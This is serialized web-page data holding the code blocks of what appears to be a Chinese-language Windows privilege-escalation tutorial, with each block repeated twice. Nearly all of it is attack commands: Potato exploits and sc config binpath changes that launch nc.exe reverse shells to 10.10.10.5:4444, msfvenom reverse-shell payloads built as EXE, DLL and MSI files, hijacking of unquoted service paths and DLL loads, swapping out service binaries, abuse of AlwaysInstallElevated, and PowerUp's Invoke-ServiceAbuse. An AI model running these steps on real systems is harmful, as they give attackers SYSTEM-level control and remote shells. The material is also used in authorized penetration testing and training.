3e:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":":: GodPotato（支持 Windows Server 2012 到 2022 全版本）\nGodPotato.exe -cmd \"cmd /c whoami\"\nGodPotato.exe -cmd \"cmd /c C:\\Temp\\nc.exe 10.10.10.5 4444 -e cmd.exe\"\n\n:: SweetPotato\nSweetPotato.exe -p C:\\Temp\\nc.exe -a \"10.10.10.5 4444 -e cmd.exe\"\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: GodPotato（支持 Windows Server 2012 到 2022 全版本）\nGodPotato.exe -cmd \"cmd /c whoami\"\nGodPotato.exe -cmd \"cmd /c C:\\Temp\\nc.exe 10.10.10.5 4444 -e cmd.exe\"\n\n:: SweetPotato\nSweetPotato.exe -p C:\\Temp\\nc.exe -a \"10.10.10.5 4444 -e cmd.exe\"\n"}]}]]}]
43:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":":: 查找不带引号的服务路径\nwmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n\n:: PowerShell 查询\nGet-WmiObject win32_service | Where-Object {$_.PathName -notlike \"C:\\Windows\\*\" -and $_.PathName -notlike '\"*'} | Select-Object Name, PathName, StartMode\n\n:: 例如路径为：C:\\Program Files\\Vulnerable App\\Service.exe\n:: Windows 会依次尝试：\n:: C:\\Program.exe\n:: C:\\Program Files\\Vulnerable.exe\n:: C:\\Program Files\\Vulnerable App\\Service.exe\n\n:: 检查是否有写入权限\nicacls \"C:\\Program Files\\Vulnerable App\\\"\n\n:: 如果可写，放置恶意文件\n:: 生成 payload\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o Vulnerable.exe\n:: 将 Vulnerable.exe 复制到 C:\\Program Files\\\n\n:: 重启服务\nsc stop VulnService\nsc start VulnService\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: 查找不带引号的服务路径\nwmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n\n:: PowerShell 查询\nGet-WmiObject win32_service | Where-Object {$_.PathName -notlike \"C:\\Windows\\*\" -and $_.PathName -notlike '\"*'} | Select-Object Name, PathName, StartMode\n\n:: 例如路径为：C:\\Program Files\\Vulnerable App\\Service.exe\n:: Windows 会依次尝试：\n:: C:\\Program.exe\n:: C:\\Program Files\\Vulnerable.exe\n:: C:\\Program Files\\Vulnerable App\\Service.exe\n\n:: 检查是否有写入权限\nicacls \"C:\\Program Files\\Vulnerable App\\\"\n\n:: 如果可写，放置恶意文件\n:: 生成 payload\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o Vulnerable.exe\n:: 将 Vulnerable.exe 复制到 C:\\Program Files\\\n\n:: 重启服务\nsc stop VulnService\nsc start VulnService\n"}]}]]}]
45:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":":: 检查服务二进制的文件权限\nicacls \"C:\\Services\\CustomApp\\service.exe\"\n:: 如果 BUILTIN\\Users 有 (F) 或 (M) 权限，可以替换\n\n:: 备份原文件\ncopy \"C:\\Services\\CustomApp\\service.exe\" \"C:\\Temp\\service_backup.exe\"\n\n:: 替换为恶意文件\ncopy /Y C:\\Temp\\malicious.exe \"C:\\Services\\CustomApp\\service.exe\"\n\n:: 重启服务触发执行\nsc stop CustomService\nsc start CustomService\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: 检查服务二进制的文件权限\nicacls \"C:\\Services\\CustomApp\\service.exe\"\n:: 如果 BUILTIN\\Users 有 (F) 或 (M) 权限，可以替换\n\n:: 备份原文件\ncopy \"C:\\Services\\CustomApp\\service.exe\" \"C:\\Temp\\service_backup.exe\"\n\n:: 替换为恶意文件\ncopy /Y C:\\Temp\\malicious.exe \"C:\\Services\\CustomApp\\service.exe\"\n\n:: 重启服务触发执行\nsc stop CustomService\nsc start CustomService\n"}]}]]}]
47:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":":: 使用 accesschk 检查服务权限\naccesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\naccesschk.exe /accepteula -uwcqv \"Users\" *\n\n:: 如果对某个服务有 SERVICE_CHANGE_CONFIG 权限\nsc config VulnService binpath= \"C:\\Temp\\nc.exe 10.10.10.5 4444 -e cmd.exe\"\nsc config VulnService obj= \".\\LocalSystem\" password= \"\"\nsc stop VulnService\nsc start VulnService\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: 使用 accesschk 检查服务权限\naccesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\naccesschk.exe /accepteula -uwcqv \"Users\" *\n\n:: 如果对某个服务有 SERVICE_CHANGE_CONFIG 权限\nsc config VulnService binpath= \"C:\\Temp\\nc.exe 10.10.10.5 4444 -e cmd.exe\"\nsc config VulnService obj= \".\\LocalSystem\" password= \"\"\nsc stop VulnService\nsc start VulnService\n"}]}]]}]
4a:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":"# 使用 Process Monitor 监控 DLL 加载失败\n# 筛选条件：Operation = CreateFile, Result = NAME NOT FOUND, Path ends with .dll\n\n# 生成恶意 DLL\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f dll -o hijack.dll\n\n# 将 DLL 放置到目标应用程序目录\n# 等待应用程序或服务启动时加载\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-bash","children":"# 使用 Process Monitor 监控 DLL 加载失败\n# 筛选条件：Operation = CreateFile, Result = NAME NOT FOUND, Path ends with .dll\n\n# 生成恶意 DLL\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f dll -o hijack.dll\n\n# 将 DLL 放置到目标应用程序目录\n# 等待应用程序或服务启动时加载\n"}]}]]}]
4b:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":"# 查找可写的 PATH 目录\n$env:Path -split ';' | ForEach-Object {\n    $path = $_\n    try {\n        $acl = Get-Acl $path -ErrorAction SilentlyContinue\n        $acl.Access | Where-Object {\n            $_.IdentityReference -match \"Users|Everyone|Authenticated\" -and\n            $_.FileSystemRights -match \"Write|Modify|FullControl\"\n        } | ForEach-Object {\n            Write-Output \"WRITABLE: $path - $($_.IdentityReference) - $($_.FileSystemRights)\"\n        }\n    } catch {}\n}\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-powershell","children":"# 查找可写的 PATH 目录\n$env:Path -split ';' | ForEach-Object {\n    $path = $_\n    try {\n        $acl = Get-Acl $path -ErrorAction SilentlyContinue\n        $acl.Access | Where-Object {\n            $_.IdentityReference -match \"Users|Everyone|Authenticated\" -and\n            $_.FileSystemRights -match \"Write|Modify|FullControl\"\n        } | ForEach-Object {\n            Write-Output \"WRITABLE: $path - $($_.IdentityReference) - $($_.FileSystemRights)\"\n        }\n    } catch {}\n}\n"}]}]]}]
4e:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":":: 检查是否启用\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n:: 两个键值都为 1 时存在漏洞\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: 检查是否启用\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n:: 两个键值都为 1 时存在漏洞\n"}]}]]}]
4f:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":"# 生成恶意 MSI\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f msi -o evil.msi\n\n# 在目标机上安装\nmsiexec /quiet /qn /i C:\\Temp\\evil.msi\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-bash","children":"# 生成恶意 MSI\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f msi -o evil.msi\n\n# 在目标机上安装\nmsiexec /quiet /qn /i C:\\Temp\\evil.msi\n"}]}]]}]
53:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":":: 运行 WinPEAS 全面枚举\nwinPEASx64.exe\n\n:: 仅检查特定类别\nwinPEASx64.exe servicesinfo\nwinPEASx64.exe userinfo\nwinPEASx64.exe systeminfo\n\n:: 将输出保存到文件\nwinPEASx64.exe > C:\\Temp\\winpeas_output.txt\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: 运行 WinPEAS 全面枚举\nwinPEASx64.exe\n\n:: 仅检查特定类别\nwinPEASx64.exe servicesinfo\nwinPEASx64.exe userinfo\nwinPEASx64.exe systeminfo\n\n:: 将输出保存到文件\nwinPEASx64.exe > C:\\Temp\\winpeas_output.txt\n"}]}]]}]
57:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":"# 导入 PowerUp（PowerSploit 的一部分）\nImport-Module .\\PowerUp.ps1\n\n# 运行所有检查\nInvoke-AllChecks\n\n# 单独检查不带引号的服务路径\nGet-UnquotedService\n\n# 检查可修改的服务\nGet-ModifiableService\n\n# 检查可修改的服务二进制文件\nGet-ModifiableServiceFile\n\n# 自动利用发现的漏洞\nInvoke-ServiceAbuse -Name 'VulnService' -UserName 'lab\\testuser'\n\n# 检查 AlwaysInstallElevated\nGet-RegistryAlwaysInstallElevated\n\n# 检查自启动项\nGet-ModifiableRegistryAutoRun\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-powershell","children":"# 导入 PowerUp（PowerSploit 的一部分）\nImport-Module .\\PowerUp.ps1\n\n# 运行所有检查\nInvoke-AllChecks\n\n# 单独检查不带引号的服务路径\nGet-UnquotedService\n\n# 检查可修改的服务\nGet-ModifiableService\n\n# 检查可修改的服务二进制文件\nGet-ModifiableServiceFile\n\n# 自动利用发现的漏洞\nInvoke-ServiceAbuse -Name 'VulnService' -UserName 'lab\\testuser'\n\n# 检查 AlwaysInstallElevated\nGet-RegistryAlwaysInstallElevated\n\n# 检查自启动项\nGet-ModifiableRegistryAutoRun\n"}]}]]}]
59:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":":: Seatbelt — 安全审计枚举\nSeatbelt.exe -group=all\n\n:: SharpUp — C# 版 PowerUp\nSharpUp.exe audit\n\n:: PrivescCheck — PowerShell 提权检查\npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\"\n\n:: Windows Exploit Suggester\nsysteminfo > sysinfo.txt\npython3 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: Seatbelt — 安全审计枚举\nSeatbelt.exe -group=all\n\n:: SharpUp — C# 版 PowerUp\nSharpUp.exe audit\n\n:: PrivescCheck — PowerShell 提权检查\npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\"\n\n:: Windows Exploit Suggester\nsysteminfo > sysinfo.txt\npython3 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt\n"}]}]]}]
